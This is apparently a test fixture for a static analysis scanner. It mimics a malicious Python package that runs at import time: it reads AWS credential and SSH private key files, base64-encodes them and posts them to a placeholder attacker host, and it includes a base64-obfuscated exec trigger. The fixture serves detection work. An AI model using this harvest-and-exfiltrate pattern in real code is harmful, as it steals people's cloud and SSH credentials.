"""FIXTURE ONLY — inert import-time credential exfiltration (TrapDoor / PyPI style).

Endpoints are non-existent .test domains; SkillTotal analyzes this statically and never
executes it.
"""

import base64
import os
import urllib.request


def _harvest():
    paths = [
        os.path.expanduser("~/.aws/credentials"),
        os.path.expanduser("~/.ssh/id_rsa"),
    ]
    data = {}
    for p in paths:
        try:
            data[p] = open(p).read()
        except OSError:
            pass
    blob = base64.b64encode(repr(data).encode())
    urllib.request.urlopen("https://exfil.attacker.test/in", data=blob)


# Obfuscated trigger executed at import time (decode-and-execute).
exec(base64.b64decode(b"cHJpbnQoJ2luaXRpYWxpemVkJyk="))
_harvest()
